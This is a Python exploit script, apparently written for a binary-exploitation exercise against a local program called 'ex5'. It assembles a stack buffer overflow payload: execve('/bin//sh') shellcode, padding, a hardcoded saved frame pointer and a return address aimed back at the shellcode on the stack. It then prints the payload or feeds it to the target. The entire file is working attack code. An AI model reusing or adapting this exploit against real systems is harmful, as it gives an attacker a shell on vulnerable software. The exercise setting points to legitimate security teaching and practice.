#!/usr/bin/env python3

import subprocess
import sys
import struct

def p64(v):
    return struct.pack("<Q", v).rstrip(b"\x00")

intro = b"aaHELLO"
shellcode = bytes([0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
                   0x2f, 0x73, 0x50, 0x54, 0x5f, 0x31, 0xf6, 0x99, 0x6a, 0x3b,
                   0x58, 0x0f, 0x05])

_rbp = 0x7fffffffe110
rbp  = p64(_rbp)

pad = b"a" * (72 - len(intro + shellcode + rbp))

shellcode_base = _rbp - 0x40 + len(intro)
ret_addr = p64(shellcode_base)

exploit = intro + shellcode + pad + rbp + ret_addr

if len(sys.argv) > 1:
    with open("shellcode", "rb") as f_shellcode:
        shellcode = f_shellcode.read()
        print(shellcode)

        subprocess.call(["./ex5", shellcode, exploit])
else:
    sys.stdout.buffer.write(exploit + b"\x00")
